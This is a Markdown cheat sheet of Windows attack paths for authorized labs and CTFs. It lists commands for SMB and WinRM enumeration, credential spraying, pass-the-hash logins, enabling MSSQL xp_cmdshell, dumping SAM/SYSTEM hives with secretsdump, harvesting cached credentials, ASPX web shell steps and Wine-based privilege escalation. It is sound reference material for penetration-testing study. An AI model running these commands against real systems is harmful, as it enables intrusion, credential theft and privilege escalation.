# Windows Attack Path Cheat Sheet

Generic Windows attack-path checklist for authorized labs and CTF environments.

Important note from the analyzed writeup set: most machines were Linux/Unix. Windows terms usually appeared as attacker-side PowerShell host discovery, Samba reporting `Windows 6.1`, LSASS dump artifacts inside Linux challenges, or Wine used for Linux privilege escalation.

For domain/Kerberos-specific material, use [Active Directory Attack Path Cheat Sheet](../tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md).

Related alternatives:

- [Service Enumeration Alternatives](../tools/Service%20Enumeration%20Alternatives.md)
- [Web Attack Alternatives](../tools/Web%20Attack%20Alternatives.md)

Use this page for native Windows targets when they appear, and for the Windows-adjacent cases found in the writeups.

## When To Classify As Windows

Likely native Windows:

- Nmap shows `Microsoft Windows`, `IIS`, `MSRPC`, `WinRM`, `RDP`, `SMB Windows`
- ports: `135`, `139`, `445`, `3389`, `5985`, `5986`, `88`, `389`, `636`
- shell commands use `whoami /priv`, `ipconfig`, `net user`, `PowerShell`, `cmd.exe`
- paths like `C:\Users\...`

Windows-adjacent only:

- Samba says `OS: Windows 6.1 (Samba ... Debian)`
- Linux box contains LSASS dump
- Linux privilege escalation uses Wine to run `cmd.exe`
- attacker machine uses PowerShell for scanning

## Native Windows Recon

```bash
nmap -p- --min-rate 5000 -oN ports.txt ip
nmap -sC -sV -O -p PORTS -oN nmap.txt ip
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 ip
```

Common services:

- SMB: `139`, `445`
- WinRM: `5985`, `5986`
- RDP: `3389`
- IIS/HTTP: `80`, `443`, `8080`
- MSSQL: `1433`
- Kerberos/LDAP: `88`, `389`, `636`

## SMB Enumeration

```bash
smbclient -L //ip/ -N
smbclient -L //ip/ -U user
enum4linux-ng -A ip
crackmapexec smb ip -u '' -p '' --shares
crackmapexec smb ip -u users.txt -p passwords.txt --continue-on-success
```

Connect:

```bash
smbclient //ip/share -N
smbclient //ip/share -U 'DOMAIN\\user'
```

Look for:

- backups
- scripts
- config files
- KeePass databases
- web roots
- unattend files
- password spreadsheets
- user lists

## WinRM

Test credentials:

```bash
crackmapexec winrm ip -u user -p pass
```

Shell:

```bash
evil-winrm -i ip -u user -p pass
evil-winrm -i ip -u user -H NTLM_HASH
```

## RDP

```bash
crackmapexec rdp ip -u user -p pass
xfreerdp /v:ip /u:user /p:pass /cert:ignore
```

## IIS / Web

```bash
whatweb http://ip/
feroxbuster -u http://ip/ -x aspx,asp,txt,config,bak,zip
ffuf -u http://ip/FUZZ -w wordlist -e .aspx,.asp,.txt,.config,.bak
```

Check:

- `web.config`
- upload forms
- ASPX shells
- backup zips
- source disclosure
- directory browsing

ASPX web shell path:

1. Upload `.aspx` if allowed.
2. Trigger command execution.
3. Upgrade to reverse shell or WinRM creds.

## MSSQL

```bash
crackmapexec mssql ip -u user -p pass
impacket-mssqlclient user:pass@ip -windows-auth
```

Useful queries:

```sql
select @@version;
select name from master..sysdatabases;
select name from sys.server_principals;
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Windows Local Enumeration

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
net user
net localgroup administrators
net localgroup "Remote Management Users"
systeminfo
cmdkey /list
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-ChildItem -Force C:\Users
Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token"
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

## Credential Hunting

Common files:

- `C:\Users\*\Desktop\*`
- `C:\Users\*\Documents\*`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\System32\config\SAM`
- `C:\Windows\System32\config\SYSTEM`
- `web.config`
- PowerShell history:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Common Windows Privilege Escalation Checks

Services:

```cmd
sc query
wmic service get name,displayname,pathname,startmode
```

Service alternatives seen in Sec-Fortress winprivesc notes:

- insecure service permissions
- unquoted service path
- weak service registry permissions
- writable service executable
- autoruns/startup apps
- scheduled tasks running as SYSTEM
- insecure GUI apps launched elevated
- token impersonation

Unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

Writable service binary/path:

```powershell
Get-Acl "C:\Path\To\Service.exe"
```

Privileges:

- `SeImpersonatePrivilege` -> Potato-style attacks in labs
- `SeBackupPrivilege` -> read SAM/SYSTEM
- `SeRestorePrivilege` -> overwrite privileged files
- `AlwaysInstallElevated` -> MSI privilege escalation
- cached creds in `cmdkey /list` -> `runas /savecred`

AlwaysInstallElevated:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Cached credentials:

```powershell
cmdkey /list
runas /user:DOMAIN\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Path\script.ps1"
```

PowerShell credential XML:

```powershell
$cred = Import-CliXml -Path C:\path\cred.xml
$cred.GetNetworkCredential() | Format-List *
```

SAM/SYSTEM offline extraction:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

Then parse offline with Impacket in an authorized lab:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## LSASS Dump Artifact Scenario

This appeared as a Linux challenge artifact: a password-protected archive contained an LSASS memory dump from a Windows system, which exposed credentials after cracking/extraction.

Workflow:

1. Extract archive.
2. Identify dump type with `file`.
3. Use appropriate offline parser in a lab.
4. Recover cleartext/password hashes.
5. Test recovered credentials against Linux or Windows services depending on the box.

## Wine-Based Linux Escalation Scenario

One writeup used Wine inside Linux: a user could run Wine with elevated permissions, then invoke Windows `cmd.exe` through Wine to execute as root-equivalent in the Linux context.

Checks:

```bash
sudo -l
find / -iname wine 2>/dev/null
```

If sudo permits Wine:

```bash
sudo wine cmd.exe
```

Then test command execution and escape to useful Linux commands if the Wine context maps host paths.

## Samba Fingerprint Caveat

Nmap may show:

```text
OS: Windows 6.1 (Samba 4.x-Debian)
```

Treat this as a Linux Samba server unless other evidence proves native Windows. Continue with SMB enumeration, but use Linux privesc after shell access.
